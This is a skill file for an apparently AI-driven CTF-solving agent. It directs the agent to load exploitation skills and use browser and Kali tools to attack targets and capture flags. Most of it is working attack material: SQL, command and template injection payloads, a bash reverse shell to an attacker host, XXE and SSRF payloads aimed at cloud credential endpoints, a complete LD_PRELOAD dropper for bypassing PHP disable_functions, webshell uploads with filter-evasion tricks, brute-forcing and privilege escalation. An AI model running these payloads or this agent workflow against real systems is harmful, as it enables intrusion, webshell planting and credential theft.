---
name: ctf-hunt
description: CTF exploitation — reuses bug bounty skills for payloads, adds flag extraction. After DISCOVERY finds candidates — load matching skill, fire payloads, capture flags.
---

# SKILL-CTF-HUNT — CTF Exploitation & Flag Capture
# Phase Coverage: CTF-3 (Payloads) → CTF-4 (Reproduction)
# Philosophy: Load the RIGHT bug bounty skill for the vuln class, adapt for CTF

---

## CTF Directory Structure — FILE PLACEMENT RULES

```
ALL CTF FILES GO IN PER-TARGET DIRECTORIES — NEVER IN ROOT.

SLUG = hostname with dots/slashes/colons → underscores
  Example: 10.48.176.42 → tryhackme_bypassdisablefunctions
  Example: box.htb → htb_box

DIRECTORY MAP:
  scripts/{target-slug}/          ← ALL exploit scripts, droppers, shells
  fullrecon/{target-slug}/        ← nmap output, gobuster results, recon
  notes/{target-slug}/            ← attack chain logs, analysis notes
  images/{target-slug}/           ← screenshots, visual evidence
  findings/{target-slug}/         ← confirmed findings
    {severity}/{vuln-class}/{title}/
      {title}.md                  ← writeup / finding report
      {title}.sh                  ← clean PoC script

FILE PLACEMENT RULES:
  ✗ NEVER create CTF_{PLATFORM}_{CHALLENGE}/ at root — use per-target dirs
  ✗ NEVER save scripts to root — always scripts/{slug}/
  ✗ NEVER save recon to root — always fullrecon/{slug}/
  ✓ Exploit scripts → scripts/{target-slug}/
  ✓ Recon output → fullrecon/{target-slug}/
  ✓ Attack chain notes → notes/{target-slug}/attack_chain.md
  ✓ Writeups → findings/{target-slug}/{severity}/{vuln-class}/{title}/{title}.md
  ✓ Clean PoCs → findings/{target-slug}/{severity}/{vuln-class}/{title}/{title}.sh
```

---

## Skill Reuse Matrix — Match Vuln to Skill

```
WHEN YOU IDENTIFY A VULN CLASS, LOAD THE CORRESPONDING SKILL:

  Vuln Found          → Load This Skill                    → CTF Adaptation
  ─────────────────────────────────────────────────────────────────────────
  SQL Injection       → SKILL-INJECTION-HUNT.md            → Extract DB → find flags in tables
  NoSQL Injection     → SKILL-INJECTION-HUNT.md            → Extract DB → find flags in collections
  Command Injection   → SKILL-INJECTION-HUNT.md            → Get shell → find flag files
  XSS                 → SKILL-CLIENTSIDE-HUNT.md           → Steal admin cookie → access flag
  CSRF                → SKILL-CLIENTSIDE-HUNT.md           → Forge admin action → reveal flag
  IDOR                → SKILL-AUTH-HUNT.md                 → Access other user's flag
  Auth Bypass         → SKILL-AUTH-HUNT.md                 → Access admin panel → flag
  JWT Vuln            → SKILL-AUTH-HUNT.md                 → Forge token → access flag
  LFI/Path Traversal  → SKILL-INJECTION-HUNT.md            → Read /flag.txt, /etc/passwd
  SSRF                → SKILL-INJECTION-HUNT.md            → Access internal services → flag
  XXE                 → SKILL-INJECTION-HUNT.md            → Read flag files via XXE
  SSTI                → SKILL-INJECTION-HUNT.md            → RCE → find flag files
  File Upload         → SKILL-CLIENTSIDE-HUNT.md           → Upload webshell → RCE → flag
  File Upload (PHP)   → SKILL-INJECTION-HUNT.md (10.1)     → Upload PHP → check disable_functions → Chankro
  disable_functions   → SKILL-INJECTION-HUNT.md (10.1)     → Chankro LD_PRELOAD → RCE → flag
  Deserialization     → SKILL-INJECTION-HUNT.md            → RCE → find flag files
  Open Redirect       → SKILL-CLIENTSIDE-HUNT.md           → OAuth steal → flag
  Buffer Overflow     → SKILL-CTF-HUNT.md (pwn section)   → ROP → shell → flag
  Crypto              → SKILL-CTF-HUNT.md (crypto section) → Decrypt → flag
  AD Exploitation     → SKILL-CTF-HUNT.md (AD section)     → DA → flag

RULE: NEVER write custom payloads when a skill already has them.
      Load the skill. Use its payloads. Adapt for CTF context.

MCP TOOLING FOR CTF:
  → Browser: playwright_browser_* for web interaction, file upload, form submission
  → Kali: kali-mcp_nmap_scan, kali-mcp_gobuster_scan for recon
  → OAST: oc-engines_oast_generate for blind injection callbacks
  → DOM Analyzer: oc-engines_dom_analyze for injection confirmation
  → Payload Mutator: oc-engines_payload_mutate for WAF bypass variations
```

---

## Phase CTF-3: PAYLOADS — Exploit Development

```
PURPOSE: Build payloads from validated hypotheses. Use skill payloads when available.

WORKFLOW:
  1. Load the matching skill from the matrix above
  2. Find the relevant payload section in the skill
  3. Adapt the payload for CTF context (flag extraction instead of data exfil)
  4. Test with minimal viable payload FIRST
  5. Log every payload sent, target endpoint, response received
  6. Update essentials/STATE_{SLUG}.md with payload results
  7. Save exploit scripts to scripts/{target-slug}/

FILE PLACEMENT:
  → Exploit scripts → scripts/{target-slug}/{vuln_class}_{surface}.sh
  → Dropper files → scripts/{target-slug}/droppers/
  → Compiled binaries → scripts/{target-slug}/
  → Attack chain log → notes/{target-slug}/attack_chain.md

MCP TOOLS FOR PAYLOAD DELIVERY:
  → playwright_browser_file_upload — upload PHP shells, SVGs, webshells
  → playwright_browser_fill_form — submit forms with payloads
  → playwright_browser_navigate — navigate to uploaded file URLs
  → playwright_browser_console_messages — check for XSS execution
  → oc-engines_oast_generate — blind injection callback tokens
  → oc-engines_payload_mutate — WAF bypass variations (deterministic)
  → oc-engines_dom_analyze — injection confirmation (structural DOM diff)
  → kali-mcp_sqlmap_scan — automated SQLi testing
```

### Web Payloads (from existing skills)

#### SQL Injection (from SKILL-INJECTION-HUNT)
```bash
# Manual verification FIRST (same as bug bounty)
' OR '1'='1
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

# CTF adaptation: extract flags from database
' UNION SELECT flag,NULL FROM flags--
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='flags'--

# Automated
sqlmap -u "http://{TARGET}/page?id=1" --dbs --batch
sqlmap -u "http://{TARGET}/page?id=1" -D {db} -T flags --dump --batch
```

#### Command Injection (from SKILL-INJECTION-HUNT)
```bash
# Basic tests (same as bug bounty)
;id
|whoami
`id`
$(whoami)

# CTF adaptation: find and read flag files
;cat /flag.txt
;find / -name "*flag*" 2>/dev/null
;grep -r "HTB{" / 2>/dev/null
;grep -r "THM{" / 2>/dev/null

# Reverse shell → flag extraction
bash -i >& /dev/tcp/{ATTACKER}/{PORT} 0>&1
# Then: cat /flag.txt, cat /home/*/user.txt, cat /root/root.txt
```

#### LFI / Path Traversal (from SKILL-INJECTION-HUNT)
```bash
# Basic (same as bug bounty)
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php

# CTF adaptation: read flag files
../../../../flag.txt
../../../../home/leonard/user.txt
../../../../root/root.txt
....//....//....//....//flag.txt

# Log poisoning → RCE → flag
# Inject PHP into User-Agent → access log via LFI → RCE → cat /flag.txt
```

#### SSTI (from SKILL-INJECTION-HUNT)
```bash
# Detection (same as bug bounty)
{{7*7}}      → 49 = Jinja2/Twig

# CTF adaptation: RCE → flag extraction
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*"').read()}}
```

#### XXE (from SKILL-INJECTION-HUNT)
```xml
<!-- CTF: read flag files via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>&xxe;</root>

<!-- Blind XXE via OAST -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{OAST_TOKEN}.oast.fun">
]>
<root>&xxe;</root>
```

#### SSRF (from SKILL-INJECTION-HUNT)
```bash
# CTF: access internal services, cloud metadata
http://127.0.0.1/flag.txt
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://127.0.0.1:6379/     # Redis → extract flags
```

#### PHP disable_functions Bypass (from SKILL-INJECTION-HUNT Phase 10.1)
```bash
# CTF: system/exec/passthru disabled but putenv+mail available → Chankro

# Step 1: Compile .so on attacker (Kali)
cat > /tmp/chankro.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("CHANKRO_CMD");
    char *out = getenv("CHANKRO_OUT");
    if (cmd) {
        FILE *fp = fopen(out ? out : "/tmp/output.txt", "w");
        FILE *pipe = popen(cmd, "r");
        if (fp && pipe) {
            char buf[4096]; size_t n;
            while ((n = fread(buf, 1, sizeof(buf), pipe)) > 0)
                fwrite(buf, 1, n, fp);
            pclose(pipe); fclose(fp);
        }
    }
}
CEOF
gcc -shared -fPIC -o /tmp/chankro.so /tmp/chankro.c
base64 /tmp/chankro.so > /tmp/chankro.b64

# Step 2: Create PHP dropper
B64=$(cat /tmp/chankro.b64 | tr -d '\n')
cat > /tmp/dropper.php << PEOF
<?php
file_put_contents('/tmp/chankro.so', base64_decode('$B64'));
chmod('/tmp/chankro.so', 0777);
putenv("CHANKRO_CMD=" . (\$_GET['cmd'] ?? 'id'));
putenv("CHANKRO_OUT=/tmp/output.txt");
putenv("LD_PRELOAD=/tmp/chankro.so");
mail("a@b.com", "", "");
usleep(200000);
echo file_get_contents('/tmp/output.txt');
?>
PEOF

# Step 3: Upload + trigger
curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -F "file=@/tmp/dropper.php;filename=shell.php;type=image/jpeg"
curl -sk "$TARGET/uploads/shell.php?cmd=cat+/home/s4vi/flag.txt"
```

#### File Upload → PHP Execution in Uploads Directory
```bash
# CTF: upload PHP shell even when form validates extension/content-type

# Test 1: Content-Type bypass
cat > /tmp/shell.php << 'EOF'
<?php echo "EXEC:" . shell_exec($_GET['cmd'] ?? 'id'); ?>
EOF
curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -F "file=@/tmp/shell.php;filename=shell.php;type=image/jpeg"

# Test 2: Try common upload paths
for path in /uploads/shell.php /files/shell.php /var/www/html/uploads/shell.php; do
  RESP=$(curl -sk "$TARGET$path?cmd=id")
  echo "$RESP" | grep -q "uid=" && echo "[PHP EXEC] $path"
done

# Test 3: If extension blocked, try double extension
for ext in ".php.jpg" ".php.png" ".php%00.jpg" ".pHp" ".PHP" ".php5" ".phtml"; do
  curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
    -F "file=@/tmp/shell.php;filename=shell${ext};type=image/jpeg"
done
```

### Binary Exploitation (CTF-specific)

```bash
# Buffer overflow (pwntools)
python3 -c 'from pwn import *; print(cyclic(200))'
python3 -c 'from pwn import *; print(cyclic_find("aaxx"))'

# ROP chain → shell → flag
ROPgadget --binary {binary} --only "pop|ret"
python3 -c 'from pwn import *; e=ELF("{binary}"); print(hex(e.plt["system"]))'

# ret2libc
p32(e.plt["system"]) + p32(e.sym["exit"]) + p32(next(e.search(b"/bin/sh")))
```

### Reverse Shell Stabilization

```bash
# Catch shell
nc -lvnp {PORT}

# Stabilize (on target)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Then extract flags
cat /flag.txt
cat /home/*/user.txt
cat /root/root.txt
```

---

## Phase CTF-4: REPRODUCTION — Attack Chain Execution & Flag Capture

```
PURPOSE: Execute attack chain step-by-step, capture all flags.

WORKFLOW:
  1. Follow validated hypothesis from Phase CTF-2
  2. Execute ONE action at a time
  3. Verify expected outcome after each
  4. If SUCCESS → log, proceed
  5. If FAILURE → pivot to next hypothesis
  6. When shell/access obtained → EXTRACT FLAGS IMMEDIATELY
  7. Log every step in chronological attack chain
  8. Update essentials/STATE_{SLUG}.md with findings and flags
  9. Update essentials/LOOP_STATE_{SLUG}.md phase progress

FILE PLACEMENT:
  → Exploit scripts → scripts/{target-slug}/
  → Attack chain log → notes/{target-slug}/attack_chain.md
  → Screenshots → images/{target-slug}/
  → Recon output → fullrecon/{target-slug}/

MCP TOOLS FOR EXPLOITATION:
  → playwright_browser_file_upload — upload webshells, droppers
  → playwright_browser_navigate — navigate to uploaded files, trigger execution
  → playwright_browser_evaluate — execute JavaScript in browser context
  → playwright_browser_network_requests — capture HTTP traffic
  → oc-engines_oast_generate — blind injection callbacks
  → oc-engines_oast_poll — check for OAST interactions
  → oc-engines_dom_analyze — injection confirmation
  → kali-mcp_nmap_scan — network discovery from target
  → kali-mcp_hydra_attack — credential brute-force
  → kali-mcp_john_crack — password hash cracking
```

### Flag Extraction Protocol

```bash
# Step 1: Standard locations
cat /home/*/user.txt
cat /root/root.txt
cat /flag.txt
cat /opt/flag.txt

# Step 2: Recursive search
find / -name "*flag*" 2>/dev/null
find / -name "*user*txt" 2>/dev/null
find / -name "*root*txt" 2>/dev/null
grep -r "HTB{" / 2>/dev/null
grep -r "THM{" / 2>/dev/null

# Step 3: Web flags
curl -s http://{TARGET}/ | grep -iE "flag|HTB|THM"
curl -s http://{TARGET}/robots.txt

# Step 4: Database flags
mysql -u root -e "SELECT * FROM flags;" 2>/dev/null
sqlite3 {db_file} "SELECT * FROM flags;"

# Step 5: Binary/memory flags
strings {binary} | grep -iE "flag|HTB|THM"
```

### Privilege Escalation (same as bug bounty)

```bash
# Linux
./linpeas.sh | tee privesc/linpeas.txt
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
uname -a

# Windows
winpeas.exe > privesc/winpeas.txt
whoami /priv
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

### Chronological Log

```
[TIME] Action: {exact command}
[TIME] Result: {output or summary}
[TIME] Status: {CONFIRMED|FALSIFIED|INCONCLUSIVE}
[TIME] Flags: {captured flags, if any}
[TIME] Next: {what to do based on result}
```

---

*SKILL-CTF-HUNT — Part of the acy Agentic CTF Solver v1.0*
*Reuses bug bounty skills → adapts for CTF → captures flags*
